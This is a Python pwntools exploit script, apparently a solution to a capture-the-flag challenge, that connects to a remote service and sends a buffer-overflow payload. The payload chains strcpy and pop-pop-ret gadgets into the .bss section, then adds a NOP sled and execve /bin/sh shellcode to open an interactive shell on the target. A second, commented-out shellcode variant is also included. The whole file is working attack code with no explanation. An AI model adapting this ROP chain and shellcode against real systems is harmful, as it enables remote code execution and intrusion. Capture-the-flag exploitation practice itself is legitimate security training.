from pwn import *


string = "fe80::9135:3fee:b51:2570." 

res=list()

puts_plt = 0x08048570
puts_got = 0x804a02c

bss = 0x0804a054
strcpy_plt = 0x08048560
ppr = 0x08048a2a
gadget1 = 0x80488a1
gadget2 = 0x80489f0
gadget3 = 0x8049fc8
#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\xa1"
shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\xa1"
p = remote("mrrobof01.3dsctf.org", 8006)
#p = process("./ip")
pay = string  + "A"*27 #+ # + [eip] + asdf => len(256)
pay += p32(strcpy_plt) + p32(ppr) + p32(bss) + p32(gadget2)
pay += p32(strcpy_plt) + p32(ppr) + p32(bss+1) + p32(gadget1)
pay += p32(strcpy_plt) + p32(ppr) + p32(bss+2) + p32(gadget3)
pay += p32(bss) 
pay += "\x90"*(264 - len(pay) - len(shellcode))
pay += shellcode

context.log_level='debug'

p.sendline(pay)
p.recvuntil("TODO")
p.interactive()
